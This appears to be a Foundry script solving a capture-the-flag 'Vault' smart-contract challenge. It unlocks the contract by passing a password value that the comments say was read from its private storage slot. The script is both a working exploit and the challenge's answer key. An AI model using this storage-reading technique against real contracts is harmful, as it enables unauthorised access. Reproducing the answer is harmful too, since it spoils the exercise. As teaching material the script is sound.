// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract VaultSolution is Script {

    Vault public vaultInstance = Vault(0x55889a0242F6A53C41f3edd871D7Ef5c6AC2851c);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Use block explorer to find state change
        // Use cast in forge to access storage slot
        vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();

        require(vaultInstance.locked() == false);
    }
}